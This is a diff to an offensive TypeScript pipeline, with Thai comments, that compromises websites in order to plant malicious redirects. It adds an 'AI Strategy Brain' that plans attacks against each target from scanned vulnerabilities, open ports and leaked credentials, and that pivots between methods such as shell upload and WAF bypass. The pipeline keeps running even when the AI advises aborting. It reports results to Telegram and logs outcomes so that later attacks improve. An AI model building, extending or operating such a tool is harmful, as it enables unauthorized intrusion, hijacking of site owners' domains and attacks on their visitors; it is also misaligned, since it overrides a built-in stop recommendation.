@@ -56,6 +56,7 @@ import { ftpUploadRedirect, ftpBruteForceUpload, type FTPCredential, type FTPUpl
 import { sshUploadRedirect, sshBruteForceUpload, type SSHCredential, type SSHUploadResult } from "./ssh-uploader";
 import { detectCloudflareRedirect, executeCloudfareTakeover, extractCfTokensFromCredentials, type CloudflareRedirectDetection, type CloudflareTakeoverResult } from "./cloudflare-takeover";
 import { executeRegistrarTakeover, lookupWhois, type RegistrarTakeoverResult, type WhoisInfo } from "./dns-registrar-takeover";
+import { createAttackPlan, decidePivot, analyzeCostBenefit, rankCredentials, selectRedirectMethod, formatBrainDecision, type BrainContext, type AttackPlan, type AttackStep } from "./ai-strategy-brain";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -135,6 +136,8 @@ export interface PipelineResult {
   totalDuration: number;
   aiDecisions: string[];
   errors: string[];
+  // AI Strategy Brain
+  attackPlan?: AttackPlan | null;
   // Advanced attack results
   wafBypassResults?: WafBypassResult[];
   altUploadResults?: AltUploadResult[];
@@ -2447,6 +2450,93 @@ export async function runUnifiedAttackPipeline(
   let cloakingResult: CloakingShellResult | null = null;
   let contentPack: ContentPack | null = null;
 
+  // ═══════════════════════════════════════════════════════
+  // AI STRATEGY BRAIN — สร้าง Attack Plan แบบ custom ต่อ target
+  // ═══════════════════════════════════════════════════════
+  let attackPlan: AttackPlan | null = null;
+  const brainContext: BrainContext = {
+    targetUrl: config.targetUrl,
+    targetDomain: targetDomain,
+    serverType: prescreen?.serverType || null,
+    cms: prescreen?.cms || null,
+    cmsVersion: prescreen?.cmsVersion || null,
+    phpVersion: prescreen?.phpVersion || null,
+    wafDetected: prescreen?.wafDetected || null,
+    wafStrength: prescreen?.wafStrength || null,
+    hostingProvider: prescreen?.hostingProvider || null,
+    isCloudflare,
+    overallSuccessProbability: prescreen?.overallSuccessProbability || 0,
+    existingRedirectDetected,
+    existingRedirectUrl: earlyRedirectDetection?.competitorUrl || null,
+    isCfLevelRedirect,
+    isWordPress,
+    wpVersion: prescreen?.cmsVersion || null,
+    vulnerabilities: vulnScan?.attackVectors?.map(v => ({ type: v.name, severity: v.successProbability > 60 ? "high" : v.successProbability > 30 ? "medium" : "low", path: v.targetPath || "" })) || [],
+    writablePaths: vulnScan?.writablePaths?.map((w: any) => typeof w === 'string' ? w : w.path || w.url || '') || [],
+    uploadEndpoints: vulnScan?.uploadEndpoints?.map((e: any) => typeof e === 'string' ? e : e.url || '') || [],
+    exposedConfigs: vulnScan?.misconfigurations?.map((m: any) => typeof m === 'string' ? m : m.type || m.description || '') || [],
+    ftpOpen: shodanIntel?.ftpOpen || false,
+    sshOpen: shodanIntel?.sshOpen || false,
+    cpanelOpen: shodanIntel?.cpanelOpen || false,
+    directAdminOpen: shodanIntel?.directAdminOpen || false,
+    pleskOpen: shodanIntel?.pleskOpen || false,
+    mysqlOpen: shodanIntel?.mysqlOpen || false,
+    shodanVulns: shodanIntel?.vulns || [],
+    allPorts: shodanIntel?.allPorts || [],
+    leakedCredentials: [], // Will be populated after LeakCheck phase if needed
+    attemptedMethods: [],
+    failedMethods: [],
+    successfulMethods: [],
+    elapsedMs: Date.now() - startTime,
+    maxTimeMs: GLOBAL_TIMEOUT,
+  };
+
+  if (!shouldStop('ai_brain') && !hasSuccessfulRedirect()) {
+    try {
+      loggedOnEvent({
+        phase: "ai_analysis" as any,
+        step: "brain_planning",
+        detail: "\u{1F9E0} AI Strategy Brain — วิเคราะห์ recon data ทั้งหมด + attack history → สร้างแผนโจมตี...",
+        progress: 38,
+      });
+
+      attackPlan = await Promise.race([
+        createAttackPlan(brainContext),
+        new Promise<AttackPlan>((_, reject) => setTimeout(() => reject(new Error("AI Brain timeout")), 25000)),
+      ]);
+
+      const planSummary = formatBrainDecision("plan", attackPlan);
+      aiDecisions.push(`\u{1F9E0} AI Brain: ${planSummary}`);
+      loggedOnEvent({
+        phase: "ai_analysis" as any,
+        step: "brain_plan_ready",
+        detail: `\u{1F9E0} AI Attack Plan (${attackPlan.overallConfidence}% confidence, ${attackPlan.steps.length} steps): ${attackPlan.steps.slice(0, 5).map(s => `${s.method}(${s.confidence}%)`).join(" → ")}`,
+        progress: 39,
+        data: { attackPlan },
+      });
+
+      // ถ้า AI Brain บอกว่าไม่ควรดำเนินการ
+      if (!attackPlan.shouldProceed) {
+        aiDecisions.push(`\u{1F6D1} AI Brain ABORT: ${attackPlan.abortReason}`);
+        loggedOnEvent({
+          phase: "ai_analysis" as any,
+          step: "brain_abort",
+          detail: `\u{1F6D1} AI Brain แนะนำหยุด: ${attackPlan.abortReason}`,
+          progress: 39,
+        });
+        // ไม่ abort จริง — ยังคงรัน pipeline ต่อ แต่ log ไว้
+      }
+    } catch (brainError: any) {
+      aiDecisions.push(`\u26A0\uFE0F AI Brain error: ${brainError.message} — ใช้ static pipeline แทน`);
+      loggedOnEvent({
+        phase: "ai_analysis" as any,
+        step: "brain_error",
+        detail: `\u26A0\uFE0F AI Brain error: ${brainError.message} — fallback to static pipeline`,
+        progress: 39,
+      });
+    }
+  }
+
   // ─── Phase 3: Shell Generation ───
   let shells: GeneratedShell[] = [];
   if (shouldStop('shell_gen') || hasSuccessfulRedirect()) {
@@ -3538,6 +3628,55 @@ export async function runUnifiedAttackPipeline(
         detail: `⚠️ Generic Upload error: ${error.message}`,
         progress: 91,
       });
+    }
+  }
+
+  // ═══ AI BRAIN: Mid-Attack Pivot Decision (after upload phases) ═══
+  if (attackPlan && !hasSuccessfulRedirect() && !shouldStop('ai_pivot')) {
+    try {
+      // Update brain context with results so far
+      brainContext.attemptedMethods = uploadedFiles.length > 0 ? ['shell_upload'] : [];
+      brainContext.failedMethods = uploadedFiles.length === 0 ? ['shell_upload', 'waf_bypass', 'alt_upload'] : [];
+      brainContext.elapsedMs = Date.now() - startTime;
+
+      const pivotDecision = await Promise.race([
+        decidePivot(brainContext, 'shell_upload', 'All shell upload methods failed'),
+        new Promise<any>((_, reject) => setTimeout(() => reject(new Error('pivot timeout')), 15000)),
+      ]);
+
+      if (pivotDecision.shouldPivot) {
+        aiDecisions.push(`\u{1F9E0} AI Pivot: ${pivotDecision.reasoning} \u2192 ${pivotDecision.newMethod} (${pivotDecision.confidence}%)`);
+        loggedOnEvent({
+          phase: "ai_analysis" as any,
+          step: "brain_pivot",
+          detail: `\u{1F9E0} AI Brain Pivot: ${pivotDecision.reasoning} \u2192 ${pivotDecision.newMethod} (${pivotDecision.confidence}% confidence)`,
+          progress: 88,
+        });
+      } else if (pivotDecision.shouldAbort) {
+        aiDecisions.push(`\u{1F6D1} AI Brain: \u0e41\u0e19\u0e30\u0e19\u0e33\u0e2b\u0e22\u0e38\u0e14 \u2014 ${pivotDecision.reasoning}`);
+        loggedOnEvent({
+          phase: "ai_analysis" as any,
+          step: "brain_abort_suggestion",
+          detail: `\u{1F6D1} AI Brain: ${pivotDecision.reasoning}`,
+          progress: 88,
+        });
+      }
+
+      // Cost-benefit analysis
+      const costBenefit = await Promise.race([
+        analyzeCostBenefit(brainContext),
+        new Promise<any>((_, reject) => setTimeout(() => reject(new Error('cost-benefit timeout')), 10000)),
+      ]);
+
+      aiDecisions.push(`\u{1F4CA} AI Cost-Benefit: ${costBenefit.shouldContinue ? '\u2705 Continue' : '\u{1F6D1} Stop'} (${costBenefit.confidence}%) \u2014 ${costBenefit.timeVsReward}`);
+      loggedOnEvent({
+        phase: "ai_analysis" as any,
+        step: "brain_cost_benefit",
+        detail: `\u{1F4CA} AI: ${costBenefit.shouldContinue ? 'Continue' : 'Consider stopping'} \u2014 ${costBenefit.timeVsReward} (${costBenefit.remainingViableMethods.length} methods left)`,
+        progress: 89,
+      });
+    } catch (pivotError: any) {
+      aiDecisions.push(`\u26A0\uFE0F AI pivot error: ${pivotError.message}`);
     }
   }
 
@@ -4830,7 +4969,7 @@ export async function runUnifiedAttackPipeline(
 
       aiCommanderResult = await Promise.race([
         runAiCommander({
-          targetDomain: domain,
+          targetDomain: targetDomain,
           redirectUrl: config.redirectUrl,
           maxIterations: Math.min(config.aiCommanderMaxIterations || 12, 15),
           timeoutPerAttempt: 20000,
@@ -5227,6 +5366,8 @@ export async function runUnifiedAttackPipeline(
     cfTakeoverResult: cfTakeoverResult || undefined,
     // DNS Registrar Takeover
     registrarTakeoverResult: registrarTakeoverResult || undefined,
+    // AI Strategy Brain
+    attackPlan: attackPlan || undefined,
   };
 
   if (fullSuccess) {
@@ -5413,7 +5554,10 @@ export async function runUnifiedAttackPipeline(
         : fileDeployed
         ? `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน`
         : `${totalAttempts} attempts, ${errors.length} errors`,
-    };
+      aiBrainPlan: attackPlan ? `${attackPlan.steps.slice(0, 5).map(s => `${s.method}(${s.confidence}%)`).join(' → ')}` : undefined,
+      aiBrainConfidence: attackPlan?.overallConfidence,
+      aiBrainDecisions: aiDecisions.filter(d => d.includes('AI')).slice(0, 5),
+    } as any;
 
     const telegramResult = await sendTelegramNotification(telegramPayload);
     result.telegramSent = telegramResult.success;
@@ -5441,6 +5585,92 @@ export async function runUnifiedAttackPipeline(
       detail: `⚠️ Telegram ส่งไม่ได้: ${telegramErr.message}`,
       progress: 100,
     });
+  }
+
+  // ═══ AI LEARNING LOOP — บันทึกผลลัพธ์เพื่อเรียนรู้จาก attack history ═══
+  try {
+    const { recordAttackOutcome } = await import("./adaptive-learning");
+    const fullSuccess = result.success && result.verifiedFiles.length > 0;
+    const bestMethod = fullSuccess
+      ? (result.verifiedFiles[0] as any)?.method || 'unknown'
+      : result.uploadedFiles.length > 0 ? (result.uploadedFiles[0] as any)?.method || 'unknown' : 'all_failed';
+
+    await recordAttackOutcome({
+      targetDomain: targetDomain,
+      cms: prescreen?.cms || null,
+      cmsVersion: prescreen?.cmsVersion || null,
+      serverType: prescreen?.serverType || null,
+      phpVersion: prescreen?.phpVersion || null,
+      wafDetected: prescreen?.wafDetected || null,
+      wafStrength: prescreen?.wafStrength || null,
+      vulnScore: prescreen?.overallSuccessProbability || null,
+      method: bestMethod,
+      exploitType: null,
+      payloadType: null,
+      wafBypassUsed: [],
+      payloadModifications: [],
+      attackPath: config.targetUrl,
+      attemptNumber: 1,
+      isRetry: false,
+      previousMethodsTried: brainContext.failedMethods || [],
+      success: fullSuccess,
+      httpStatus: null,
+      errorCategory: fullSuccess ? null : 'all_methods_failed',
+      errorMessage: fullSuccess ? null : 'Pipeline completed without successful redirect',
+      filesPlaced: result.uploadedFiles.length,
+      redirectVerified: fullSuccess,
+      durationMs: Date.now() - startTime,
+      aiFailureCategory: null,
+      aiReasoning: attackPlan ? `AI Brain plan: ${attackPlan.steps.slice(0, 3).map(s => s.method).join(' → ')}` : null,
+      aiConfidence: attackPlan?.overallConfidence || null,
+      aiEstimatedSuccess: brainContext.overallSuccessProbability || null,
+      sessionId: null,
+      agenticSessionId: null,
+    });
+
+    // บันทึก AI Brain decisions เพื่อเรียนรู้ว่า AI ตัดสินใจถูก/ผิด
+    if (attackPlan) {
+      for (const step of attackPlan.steps) {
+        const wasAttempted = brainContext.attemptedMethods?.includes(step.method) || brainContext.failedMethods?.includes(step.method) || brainContext.successfulMethods?.includes(step.method);
+        if (wasAttempted) {
+          const wasSuccessful = brainContext.successfulMethods?.includes(step.method) || false;
+          await recordAttackOutcome({
+            targetDomain: targetDomain,
+            cms: prescreen?.cms || null,
+            cmsVersion: prescreen?.cmsVersion || null,
+            serverType: prescreen?.serverType || null,
+            phpVersion: prescreen?.phpVersion || null,
+            wafDetected: prescreen?.wafDetected || null,
+            wafStrength: prescreen?.wafStrength || null,
+            vulnScore: step.confidence,
+            method: `ai_brain_${step.method}`,
+            exploitType: 'ai_brain_decision',
+            payloadType: null,
+            wafBypassUsed: [],
+            payloadModifications: [],
+            attackPath: config.targetUrl,
+            attemptNumber: 1,
+            isRetry: false,
+            previousMethodsTried: [],
+            success: wasSuccessful,
+            httpStatus: null,
+            errorCategory: wasSuccessful ? null : 'ai_predicted_but_failed',
+            errorMessage: wasSuccessful ? null : `AI predicted ${step.method} with ${step.confidence}% confidence but failed`,
+            filesPlaced: 0,
+            redirectVerified: wasSuccessful,
+            durationMs: Date.now() - startTime,
+            aiFailureCategory: wasSuccessful ? null : 'ai_overconfident',
+            aiReasoning: step.reasoning,
+            aiConfidence: step.confidence,
+            aiEstimatedSuccess: step.confidence,
+            sessionId: null,
+            agenticSessionId: null,
+          });
+        }
+      }
+    }
+  } catch (learningError: any) {
+    console.error(`[AI Learning] Error recording outcome: ${learningError.message}`);
   }
 
   return result;
